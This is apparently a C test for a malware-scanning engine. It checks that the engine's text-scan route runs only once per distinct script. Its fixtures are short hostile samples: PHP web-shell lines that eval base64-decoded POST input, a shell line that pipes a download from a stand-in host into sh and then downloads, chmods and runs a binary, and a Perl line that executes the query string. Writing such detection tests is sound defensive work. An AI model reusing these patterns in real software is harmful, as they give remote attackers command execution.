/*
 * text_scan_once - the work-once metric of the TEXT route, END TO END: how many times the route's scan runs over one script, counted at the one call every stage makes
 * (kgenome_diag_scan_text is wrapped at link time, UNIT_LIBS_text_scan_once; no counter in the engine).
 *
 * The symbol block (the names), the constants stage and the diagnose stage each need a walk of the text, and scanners/objctx_textscan.c makes ONE for whichever asks first and hands
 * it to the others (and gives the graph to the diagnose stage, which owns it from then on and frees it with the object). The rule (CLAUDE.md, merge process 3) is "scans per distinct
 * text: 1". text_scan_hold.c pins the hand-over one stage at a time on a bare scanner; this runs the whole pipeline (kscan_bytes against the test database, the normalised view and
 * every stage that asks) over scripts of five languages and records each text the route is asked to scan: the SAME bytes must never be scanned twice.
 *
 * The scan is also the lifetime question of a leak that text_scan_hold's sanitised run found: a graph that oc_text_take hands over is the taker's. Here the taker is the engine's
 * own diagnose stage, and under unit-asan this test runs the whole path with leak detection on.
 *
 * usage: text_scan_once [database dir]
 */

#include "caps_fix.h"
#include "caps_e2e.h"

#include <phenotype/diag_scan.h>

struct kgenome_diag_scan *__real_kgenome_diag_scan_text(const struct kgenome_diag_text_req *rq);
struct kgenome_diag_scan *__wrap_kgenome_diag_scan_text(const struct kgenome_diag_text_req *rq);

#define MAX_CALLS 64u

static struct {
	uint64_t h;                 /* FNV-1a of the text and its language */
	uint64_t size;
	uint32_t lang;
	uint8_t  consts, names;     /* which callbacks the call carried */
} calls[MAX_CALLS];
static unsigned ncalls, overflow;

struct kgenome_diag_scan *__wrap_kgenome_diag_scan_text(const struct kgenome_diag_text_req *rq)
{
	uint64_t h = 14695981039346656037ull;
	uint64_t i;

	for (i = 0; i < rq->size; i++)
		h = (h ^ rq->base[i]) * 1099511628211ull;
	h = (h ^ rq->lang) * 1099511628211ull;
	if (ncalls < MAX_CALLS) {
		calls[ncalls].h = h;
		calls[ncalls].size = rq->size;
		calls[ncalls].lang = rq->lang;
		calls[ncalls].consts = rq->on_const != NULL;
		calls[ncalls].names = rq->on_node != NULL;
		ncalls++;
	} else {
		overflow++;
	}
	return __real_kgenome_diag_scan_text(rq);
}

static const struct { const char *name; const char *text; } T[] = {
	{ "php", "<?php\n// padding padding padding padding\n$a = 'sys' . 'tem'; $a($_GET['c']); eval(base64_decode($_POST['x']));\n$f = 'ba' . 'se64_decode'; $d = $f('abc'); eval($d);\n" },
	{ "php request", "<?php\n// padding padding padding padding\neval($_GET['c']);\n" },
	{ "sh", "#!/bin/sh\n# padding padding padding padding\nx=cur; $x\"l\" http://h/p | sh\nwget -O /var/x/a http://h/a\nchmod +x /var/x/a\n/var/x/a\n" },
	{ "js", "// padding padding padding padding\nvar f = 'ev' + 'al'; var s = new ActiveXObject('WScript.Shell'); s.Run(c); eval(x);\n" },
	{ "python", "#!/usr/bin/python3\n# padding padding padding padding\nimport os, base64\nd = base64.b64decode(s)\nos.system('ls ' + 'x'.upper())\nexec(d)\n" },
	{ "perl", "#!/usr/bin/perl\n# padding padding padding padding\nmy $c = $ENV{QUERY_STRING}; system($c); my $x = lc('A') . 'b'; eval($x);\n" },
};

int main(int argc, char **argv)
{
	size_t k;
	unsigned total = 0, repeated = 0;

	if (!e2e_open(argc > 1 ? argv[1] : NULL)) {
		printf("text_scan_once: cannot open the test database - nothing tested\n");
		return 0;
	}
	for (k = 0; k < sizeof T / sizeof T[0]; k++) {
		struct e2e r;
		unsigned i, j, rep = 0;

		ncalls = overflow = 0;
		memset(&r, 0, sizeof r);
		CK(e2e_scan((const uint8_t *)T[k].text, strlen(T[k].text), &r) != 0);
		CK(ncalls >= 1u && overflow == 0u);
		for (i = 0; i < ncalls; i++)
			for (j = 0; j < i; j++)
				if (calls[i].h == calls[j].h && calls[i].size == calls[j].size && calls[i].lang == calls[j].lang)
					rep++;
		printf("  %-12s %u scan(s) of the route:", T[k].name, ncalls);
		for (i = 0; i < ncalls; i++)
			printf(" [%llu bytes lang %u%s%s]", (unsigned long long)calls[i].size, calls[i].lang, calls[i].names ? " names" : "", calls[i].consts ? " consts" : "");
		printf("  -> %u of them over a text already scanned\n", rep);
		if (rep) {
			printf("  FAIL %s: a text was scanned %u more time(s) than once\n", T[k].name, rep);
			fails++;
		}
		total += ncalls;
		repeated += rep;
	}
	printf("text_scan_once: %u scans over %zu scripts, %u repeated (scans per distinct text: %s)\n", total, sizeof T / sizeof T[0], repeated, repeated ? "MORE THAN 1" : "1");
	return fails != 0 || repeated != 0;
}
